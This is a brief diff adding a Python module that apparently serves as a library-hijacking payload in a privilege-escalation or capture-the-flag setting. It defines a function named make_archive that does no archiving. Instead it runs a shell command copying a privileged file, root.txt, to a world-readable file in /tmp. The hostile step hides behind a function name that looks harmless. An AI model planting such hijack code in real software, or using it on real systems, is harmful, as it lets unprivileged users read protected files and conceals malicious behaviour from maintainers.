@@ -1,0 +1,4 @@
+import os
+
+def make_archive(a,b,c):
+    os.system("cat root.txt > /tmp/root_flag.txt")
